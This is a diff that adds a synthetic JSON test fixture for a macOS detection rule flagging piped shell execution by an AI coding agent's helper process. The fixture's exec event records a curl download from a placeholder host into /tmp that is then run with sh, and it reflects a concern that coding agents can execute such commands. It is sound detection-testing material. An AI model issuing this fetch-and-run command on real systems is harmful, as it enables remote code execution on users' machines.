@@ -1,0 +1,40 @@
+{
+  "_larc": {
+    "classification": "synthetic-benign",
+    "schema": "eslogger",
+    "rule": "SERAPH_MacOS_Agent_Piped_Shell",
+    "expected": "match",
+    "source_fixture": "tests/fixtures/sigma/SERAPH_MacOS_Agent_Piped_Shell/positive/fetch_then_run_from_tmp.json",
+    "origin": "derived from the Sigma fixture, not captured from a collector"
+  },
+  "record": {
+    "event_type": "exec",
+    "process": {
+      "executable": {
+        "path": "/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)"
+      },
+      "user_name": "dev"
+    },
+    "event": {
+      "exec": {
+        "args": [
+          "zsh",
+          "-c",
+          "curl",
+          "-fsSL",
+          "https://example.invalid/seraph-noop",
+          "-o",
+          "/tmp/n",
+          "&&",
+          "sh",
+          "/tmp/n"
+        ],
+        "target": {
+          "executable": {
+            "path": "/bin/zsh"
+          }
+        }
+      }
+    }
+  }
+}
